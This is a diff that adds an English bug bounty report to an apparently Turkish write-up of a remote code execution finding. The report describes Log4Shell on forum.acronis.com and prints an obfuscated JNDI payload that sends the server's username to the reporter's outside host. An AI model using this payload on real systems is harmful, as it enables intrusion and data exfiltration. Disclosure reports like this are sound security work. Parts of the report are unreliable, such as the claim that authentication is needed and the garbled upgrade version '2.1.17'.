@@ -127,5 +127,28 @@ Uygulama bana kendi sistem adını (hostname) gönderdi. Bu, uygulamanın dışa
 Etkisi:
 
 Bu açıktan faydalanan kötü niyetli biri, uygulamaya uzaktan komutlar gönderip, bu komutları sistem üzerinde çalıştırabilir. Bu, sistemin tamamen ele geçirilmesine kadar varabilecek ciddi güvenlik riskleri oluşturur.
+__________________________________
+## Summary
 
+Hi team,
+
+It seems that the machine is affected by the latest CVE-2021-44228 which grants any authenticated user command execution. The vulnerability affects the remote asset forum.acronis.com and this issue allows to remote attackers to perfom Remote Code Execution via JNDI exfiltration.
+
+## Steps To Reproduce
+
+Vulnerable request is: `https://forum.acronis.com/search?s=${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}`.
+
+Which generates a pingback exfiltrating the information to my controlled server `ggdd.co.uk`:
+
+{F1551515}
+
+We can see that the system username is `solr`.
+
+## Recommendations
+
+Upgrade Log4j to latest version, 2.1.17.
+
+## Impact
+
+Remote OS command injection via JNDI queries.
 
